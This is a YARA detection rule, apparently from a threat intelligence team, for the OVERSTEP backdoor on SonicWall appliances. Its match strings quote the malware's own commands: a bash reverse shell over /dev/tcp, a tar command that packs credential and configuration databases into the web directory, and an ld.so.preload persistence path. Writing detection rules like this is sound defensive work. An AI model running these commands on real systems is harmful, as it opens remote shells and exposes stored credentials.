rule G_Backdoor_OVERSTEP_1 {
	meta:
		author = "Google Threat Intelligence Group"
    date = "2025-06-03"
		date_created = "2025-06-03"
		date_modified = "2025-06-03"
		rev = 1
		hash = "b28d57269fe4cd90d1650bde5e9056116de26d211966262e59359d0e2a67d473"
    reference = "https://cloud.google.com/blog/topics/threat-intelligence/sonicwall-secure-mobile-access-exploitation-overstep-backdoor"
	strings:
		$s1 = "dobackshell"
		$s2 = "dopasswords"
		$s3 = "bash -i >& /dev/tcp/%s 0>&1 &"
		$s4 = "tar czfP /usr/src/EasyAccess/www/htdocs/%s.tgz /tmp/temp.db /etc/EasyAccess/var/conf/persist.db /etc/EasyAccess/var/cert; chmod 777"
		$s5 = "/etc/ld.so.preload"
		$s6 = "libsamba-errors.so.6"
	condition:
		0x464c457f and filesize < 2MB and 4 of them
}
